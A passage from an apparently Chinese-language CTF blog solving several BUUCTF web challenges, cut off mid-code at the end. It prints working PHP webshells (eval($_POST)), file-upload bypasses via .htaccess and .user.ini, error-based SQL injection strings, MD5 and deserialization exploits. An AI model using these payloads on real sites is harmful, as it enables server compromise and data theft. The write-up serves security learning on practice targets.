class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>运行上面代码拿到序列化后的字符串: 这也就是参数<code>password</code>所需的值</p><img src="/images/buuctf-web/image-20221016231639955.png" alt="image-20221016231639955" style="zoom:67%;" /><p>最后构造最终的<code>payload</code>: 别忘了利用<code>file</code>参数来包含<code>useless.php</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>查看源码得到flag:</p><img src="/images/buuctf-web/image-20221016231844331-166704781973570.png" alt="image-20221016231844331" style="zoom:67%;" /><br><hr><br><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>一进来被臭到了</p><img src="/images/buuctf-web/image-20221017113107172-166704781973571.png" alt="image-20221017113107172" style="zoom:67%;" /><p>试试传文件有哪些限制, 这里直接传php一句话木马,然后抓包把扩展名和<code>Content-Type</code>字段改一下就能够传成功</p><img src="/images/buuctf-web/image-20221017105933409.png" alt="image-20221017105933409" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;&lt;br /&gt;</span><br><span class="line">&lt;b&gt;Warning&lt;/b&gt;:  mkdir(): File exists in &lt;b&gt;/var/www/html/upload.php&lt;/b&gt; on line &lt;b&gt;23&lt;/b&gt;&lt;br /&gt;</span><br><span class="line">/var/www/html/upload/c254d40d92f59c4fed06e9c1938ddd84/one_sentence.png succesfully uploaded!</span><br></pre></td></tr></table></figure><p>但是这样传上去之后,使用菜刀或者蚁剑会连接失败</p><img src="/images/buuctf-web/image-20221017111421512-166704781973573.png" alt="image-20221017111421512" style="zoom:50%;" /><h2 id="利用-htaccess文件"><a href="#利用-htaccess文件" class="headerlink" title="利用.htaccess文件"></a>利用<code>.htaccess</code>文件</h2><p>**这里测试了一下,<code>.htaccess</code>文件也是可以传的,那么可以通过此文件改变当前目录下文件的扩展名: **参考<a href="aeaad0f.html">Apache的文件解析漏洞</a></p><p><code>.htaccess</code>: 这里可以让服务器把<code>.htaccess</code>同目录下的<code>a.png</code>当作<code>php</code>文件来执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;a.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><img src="/images/buuctf-web/image-20221017112731883.png" alt="image-20221017112731883" style="zoom:80%;" /><p>接下来传一个命名为<code>a.png</code>的一句话木马就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/upload/632e7c4669947e64e5607856061b2c07/a.png succesfully uploaded!</span><br></pre></td></tr></table></figure><p>成功连接并找到flag:</p><img src="/images/buuctf-web/image-20221017113009623-166704781973572.png" alt="image-20221017113009623" style="zoom:67%;" /><br><hr><br><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h2><p>这里考察基于报错的注入,原理具体见<a href="94662ad7.html">SQL注入</a></p><p>这里很多字符都被过滤了,包括空格,所以需要加空格的地方使用括号来代替.  等于号被代替了,所以下面需要等于号的地方用<code>like</code>模糊查询来代替</p><p>爆库名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">admin&#x27;^extractvalue(1,concat(0x7e,(database()),0x7e))#</span><br><span class="line">password输入:随便</span><br><span class="line">输出:XPATH syntax error: &#x27;~geek~&#x27;</span><br></pre></td></tr></table></figure><p>爆表名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#x27;geek&#x27;))),0x7e),1))#</span><br><span class="line">password输入:随便</span><br><span class="line">输出:XPATH syntax error: &#x27;~H4rDsq1~&#x27;</span><br></pre></td></tr></table></figure><p>爆列名:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#x27;H4rDsq1&#x27;))),0x7e),1))#</span><br><span class="line">password输入:随便</span><br><span class="line">输出:XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure><p>爆数据:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))#</span><br><span class="line">username输入:</span><br><span class="line">输出:XPATH syntax error: &#x27;~flag&#123;2051cec7-0336-41ed-b551-9f&#x27;</span><br></pre></td></tr></table></figure><p>注意到这里只输出了一半的flag,使用<code>right</code>函数来从后往前输出20位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username输入:</span><br><span class="line">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1)),0x7e),1))#</span><br><span class="line">username输入:</span><br><span class="line">输出:XPATH syntax error: &#x27;~d-b551-9f49d0135390&#125;~&#x27;</span><br><span class="line">flag&#123;2051cec7-0336-41ed-b551-9f49d0135390&#125;</span><br></pre></td></tr></table></figure><p>两次的结果拼接成完整的flag</p><br><hr><br><h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>源码里找到有缩进的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//I put something in F12 for you include &#x27;flag.php&#x27;;Please input first</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>)&amp;&amp;<span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一步,<code>id</code>和<code>gg</code>值不相等,但是<code>md5</code>计算结果相等, 数组绕过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[]=1&amp;gg[]=2</span><br></pre></td></tr></table></figure><p>第二步,POST传<code>passwd</code>参数,要求等于1234567,还要是字符串,那么传数字加字母就行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=1234567a</span><br></pre></td></tr></table></figure><br><hr><br><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="利用-user-ini"><a href="#利用-user-ini" class="headerlink" title="利用.user.ini"></a>利用<code>.user.ini</code></h2><p>这里的上传对文件内容进行检测,例如php文件中的<code>&lt;?</code>就会被过滤掉, 同时还会检测是否上传的是图片:</p><p>因此使用<code>GIF89</code>+<code>script</code>的形式进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt; @eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上述文件命名为<code>scri.jpg</code>,能够成功上传</p><p>接下来需要解决怎样让上传的图片马在服务器端执行的问题, <strong>这里尝试上传<code>.htaccess</code>文件,不起作用</strong></p><p>另外一种方法是上传<code>.user.ini</code>文件:</p><blockquote><p><code>.user.ini</code>实际上就是一个可以由用户自定义的<code>php.ini</code>配置文件，我们能够自定义的设置是模式为“<code>PHP_INI_PERDIR</code> 、 <code>PHP_INI_USER</code>”的设置。<br>它比<code>.htaccess</code>(分布式配置文件)用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<code>fastcgi</code>(进程管理器)运行的php都可以用这个方法。</p><p>其中有两项可以为我们所用:</p><ul><li><p><code>auto_prepend_file</code>指定一个文件，自动<strong>包含在要执行的文件前</strong>，类似于在文件前调用了<code>require()</code>函数。</p></li><li><p><code>auto_append_file</code>类似，只是<strong>在文件后面包含</strong>。</p></li></ul><p><strong>例如如果同目录下有<code>.user.ini</code>,其内容为:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;auto_prepend_file=&quot;1.jpg&quot;</span><br></pre></td></tr></table></figure><p><strong>那么在执行同目录下的<code>index.php</code>(或者其他php文件)时,就会先自动地对<code>1.jpg</code>进行包含</strong></p></blockquote><p>那么这里就可以准备一个<code>.user.ini</code>,其内容为: 这里前面加GIF是为了绕过<code>exif_imagetype</code>对文件内容的检测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line">auto_prepend_file=&quot;scri.jpg&quot;</span><br></pre></td></tr></table></figure><p>将此文件上传:</p><img src="/images/buuctf-web/image-20221017162117205-166704781973574.png" alt="image-20221017162117205" style="zoom:67%;" /><p><strong>这里注意到同目录下有个<code>index.php</code>,那么现在如果运行<code>index.php</code>就会自动包含<code>scri.jpg</code></strong></p><p>那么现在可以使用蚁剑来连接<code>index.php</code>了: 连接上后在根目录找到flag.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d0916e13-9c97-47a1-a8f5-495883e6157f.node4.buuoj.cn:81/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure><p>另一种方法: 直接通过命令执行来找到flag:</p><img src="/images/buuctf-web/image-20221017162341878-166704781973575.png" alt="image-20221017162341878" style="zoom:67%;" /><br><hr><br><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>反序列化题目, 给代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>((<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$this</span>-&gt;content); <span class="comment">//把字符串写入文件中</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// op属性值为2的时候,才会从process处调用此方法. 但问题是调用process方法是在__construct和__destruct中</span></span><br><span class="line"><span class="comment">// 在__destruct,如果检测到op的值为2,则会将其变为1,这样后面调用process()时就无法达到读取文件的目的了</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;  <span class="comment">//需要利用此函数来读取文件,flag.php. filename属性存储文件名</span></span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>)) <span class="comment">//返回ascii码值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123; </span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;  <span class="comment">//str参数的每个字符必须在is_valid限制的ascii码范围之内</span></span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拿到本地来运行,注意这里的<code>protected</code>属性无法在类外面给其赋值,遂直接在类内部赋值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>=<span class="string">&quot;2&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化的结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>但这里问题就来了,对于<code>private</code>和<code>protected</code>的属性,在反序列化时需要在相应的类名或者<code>*</code>两侧加上<code>%00</code>,但是本题的代码中,<code>%00</code>并不在<code>is_valid</code>函数允许的范围里</p><p><strong>这里服务器的版本是PHP7.4.3,对修饰符不敏感,因此直接改成<code>public</code>就行</strong></p><p>另外, 我们需要在反序列化后通过自动调用的<code>__destruct()</code>函数来调用<code>process()</code>,然后再调用<code>read</code>来达到读取<code>flag.php</code>的目的</p><p>但是<code>__destruct()</code>函数如果检测到<code>op</code>的值为2,会将其变为1</p><p>但是注意到<code>__destruct()</code>中用的是<code>===</code>强比较,会检测数据的类型, 而在<code>process()</code>中用的是弱比较,只检测值,所以传数值型的<code>op</code>就可以绕过<code>__destruct()</code>中的判断了</p><p>修改后的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>那么payload: (如果直接在浏览器的url框里输入的话,还需要手动进行一次url编码)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://92545990-4fc0-4d2e-b817-e5ac4b33b072.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>查看源码得到flag</p><img src="/images/buuctf-web/image-20221017192403857.png" alt="image-20221017192403857" style="zoom:67%;" /><br><hr><br><h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>在尝试各种方法注入的过程中,发现返回内容中有一串字符:</p><img src="/images/buuctf-web/image-20221017200430122.png" alt="image-20221017200430122" style="zoom:67%;" /><p>这段字符比较像<code>base32</code>编码后的形态,将其使用<code>base</code>32解码得到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</span><br></pre></td></tr></table></figure><p>这显然是<code>base64</code>了,继续解码得到查询语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 